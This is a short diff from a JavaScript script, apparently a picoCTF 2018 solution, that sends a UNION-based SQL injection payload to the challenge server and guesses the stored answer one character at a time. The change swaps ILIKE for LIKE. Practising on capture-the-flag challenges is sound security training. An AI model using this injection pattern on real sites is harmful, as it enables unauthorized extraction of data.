@@ -8,7 +8,7 @@ const bf = i => {
     {
       url: 'http://2018shell.picoctf.com:15987/answer2.php',
       form: {
-        answer: `'UNION SELECT * FROM answers WHERE answer ILIKE '${pass.join('')}${i}%`
+        answer: `'UNION SELECT * FROM answers WHERE answer LIKE '${pass.join('')}${i}%`
       }
     },
     (err, res, body) => {
